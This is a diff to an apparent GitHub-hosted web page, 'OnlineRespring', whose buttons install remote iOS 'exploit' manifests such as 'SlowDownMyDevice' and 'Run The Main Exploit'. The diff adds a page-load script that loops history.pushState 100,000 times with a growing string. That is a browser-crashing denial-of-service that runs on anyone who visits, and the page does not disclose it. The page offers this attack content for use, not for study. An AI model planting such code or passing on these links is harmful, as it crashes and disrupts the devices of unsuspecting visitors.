@@ -7,7 +7,7 @@
 							<footer> <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/CloudFTL/OnlineRespring/master/SlowDownMyDevice.plist" class="button circled scrolly" onclick="change()">KillME</a>
 								<a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/CloudFTL/OnlineRespring/master/respring.plist" class="button circled scrolly" onclick="change()">Run The Main Exploit</a>
 					            </footer>   <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/CloudFTL/OnlineRespring/master/respring10.plist" class="button circled scrolly" onclick="change()">Run The Blake Exploit</a>
-				        <center><br/><br/><br/> <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/CloudFTL/OnlineRespring/master/respring000.plist" class="button circled scrolly" onclick="change()">Run The New 000 Exploit</a>
+				        <center><br/><br/><br/> <a href="itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/CloudFTL/OnlineRespring/master/respring000.plist" class="button circled scrolly" onclick="change()">Run The 000 Exploit</a>
 <br/><br/><br/><div id="execute">Exploits Made By CloudFTL Enjoy 
 						</div>
 <script language="javascript">
@@ -19,6 +19,11 @@
          var host = "http://github.com/CloudFTL/OnlineRespring";
          if ((host == window.location.host) && (window.location.protocol != "https:"))
          window.location.protocol = "https";
+          var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
 </script>
 <a class="nav-link" href="https://github.com/CloudFTL/OnlineRespring">
                   <span class="d-none d-sm-inline"> View on GitHub </span>
